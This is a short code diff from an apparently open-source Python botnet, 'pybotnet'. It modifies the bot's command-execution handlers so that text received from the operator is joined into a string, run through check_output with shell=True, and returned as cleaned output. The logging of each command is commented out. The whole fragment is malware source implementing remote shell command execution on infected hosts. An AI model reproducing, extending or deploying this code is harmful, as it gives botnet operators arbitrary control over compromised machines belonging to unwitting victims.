@@ -88,7 +88,7 @@ def get_info(pybotnet_up_time, logger):
 def execute_cmd(command, logger) -> str:
     try:
         command = split_command(command)
-        command = command[1:]
+        command = ' '.join(command[1:])
     except:
         return 'execute_cmd invalid command; Wrong format'
 
@@ -98,13 +98,15 @@ def execute_cmd(command, logger) -> str:
         return 'cmd error'
 
 
-def cmd(command,  logger) -> str:
-    logger.info(f'try to run: {command}')
+def cmd(command: str,  logger=None) -> str:
+    '''command sample: ['ls', '.','-ltrh']'''
+    # logger.info(f'try to run: {command}')
 
-    output = check_output(command, shell=True)
-    return str(output).replace('\\r\\n', '\n')  # cleaning data
-
+    output = check_output([command], shell=True)
+    output = str(output).replace('\\r\\n', '\n')  # cleaning data
+    output = output[2:]  # remove b'
     # TODO: add timeout
+    return output
 
 
 def execute_ls(command, logger) -> str:
